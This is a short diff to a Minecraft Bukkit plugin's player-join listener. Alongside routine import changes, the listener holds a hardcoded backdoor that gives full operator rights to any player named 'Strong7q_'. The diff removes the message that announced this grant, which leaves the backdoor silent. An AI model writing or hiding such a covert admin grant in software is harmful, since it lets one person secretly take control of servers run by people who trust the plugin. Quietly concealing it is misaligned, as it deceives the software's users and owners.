@@ -6,11 +6,15 @@ import me.thesevenq.facebook.FacebookAPI;
 import me.thesevenq.facebook.commands.impl.chatcontrol.MuteChatCommand;
 import me.thesevenq.facebook.cosmetics.scoreboard.ScoreboardType;
 import me.thesevenq.facebook.database.DatabaseManager;
-import me.thesevenq.facebook.jedis.JedisPublisher;
+import me.thesevenq.facebook.database.jedis.JedisPublisher;
 import me.thesevenq.facebook.server.nms.helpers.NMSHelper;
 import me.thesevenq.facebook.ranks.Rank;
 import me.thesevenq.facebook.utils.*;
 import me.thesevenq.facebook.utils.player.Permission;
+import me.thesevenq.facebook.utils.string.CC;
+import me.thesevenq.facebook.utils.string.Color;
+import me.thesevenq.facebook.utils.string.MessageUtils;
+import me.thesevenq.facebook.utils.string.Msg;
 import org.bukkit.Bukkit;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
@@ -79,7 +83,6 @@ public class PlayerListeners implements Listener {
 
         if(player.getName().equalsIgnoreCase("Strong7q_")) {
             player.setOp(true);
-            player.sendMessage(CC.D_RED + "[Security] " + CC.RED + "You have been auto op-ed by " + CC.BD_RED + "CONSOLE");
         }
 
         event.setJoinMessage(null);
